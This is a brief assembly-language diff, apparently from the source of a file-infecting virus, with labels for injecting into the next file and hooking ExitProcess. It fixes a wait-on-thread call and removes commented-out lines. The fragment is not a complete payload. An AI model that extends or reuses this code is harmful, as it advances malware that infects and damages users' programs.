@@ -22,8 +22,8 @@ jmp	nextFileToInject
 
 ; Wait for thread old program and exit
 errorExit:
-PVDELTA	ThreadId
 push	INFINITE
+PVDELTA	ThreadHandle
 call	[DELTA pWaitForSingleObject]
 push	0
 call	[DELTA pExitProcess]
@@ -37,8 +37,6 @@ nop
 nop
 
 hook_exitprocess:
-; push	0
-; call	[DELTA pExitThread]
 pop	eax ; Remove push ExitProcess
 pop	eax ; Remove return ExitProcess
 ret	; Thread return
